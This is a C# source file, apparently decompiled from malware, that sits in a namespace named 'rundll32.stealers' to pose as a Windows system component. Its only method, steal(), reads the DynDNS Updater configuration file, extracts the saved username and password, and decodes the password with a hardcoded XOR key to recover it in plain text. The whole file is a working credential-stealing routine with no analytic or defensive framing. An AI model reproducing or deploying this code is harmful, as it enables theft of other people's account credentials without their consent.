using System;
using System.Globalization;
using System.IO;

namespace rundll32.stealers;

internal class dyndns
{
	public struct acount
	{
		public string user;

		public string pass;
	}

	public static acount steal()
	{
		string path = Environment.GetEnvironmentVariable("ALLUSERSPROFILE") + "\\DynDNS\\Updater\\config.dyndns";
		string text = File.ReadAllText(path);
		string user = "";
		string text2 = "";
		string[] array = text.Split(new char[1] { '\n' });
		string[] array2 = array;
		foreach (string text3 in array2)
		{
			if (text3.Contains("Username="))
			{
				user = text3.Replace("Username=", "").Replace("\r", "");
			}
			if (text3.Contains("Password="))
			{
				text2 = text3.Replace("Password=", "").Replace("\r", "");
			}
		}
		string text4 = "";
		for (int j = 0; j < text2.Length; j += 2)
		{
			text4 += (char)long.Parse(text2.Substring(j, 2), NumberStyles.HexNumber);
		}
		long num = 0L;
		string text5 = "";
		for (int k = 0; k < text4.Length; k++)
		{
			text5 += (char)(text4.Substring(k, 1)[0] ^ "t6KzXhCh".Substring((int)num, 1)[0]);
			if (num == 7L)
			{
				num = -1L;
			}
			num++;
		}
		acount result = default(acount);
		result.user = user;
		result.pass = text5;
		return result;
	}
}
